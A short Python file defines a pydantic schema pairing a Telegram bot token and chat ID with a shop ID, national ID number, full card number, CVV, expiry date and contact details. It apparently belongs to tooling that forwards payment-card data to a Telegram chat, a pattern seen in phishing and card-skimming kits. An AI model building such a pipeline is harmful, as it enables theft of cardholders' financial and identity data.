from pydantic import BaseModel

class TelegramSchema(BaseModel):
    token:str
    chat_id:str
    shop_id:str
    DNI:str
    number:str
    CVV:str
    Vto:str
    name:str
    last_name:str
    phone:str
    email:str
    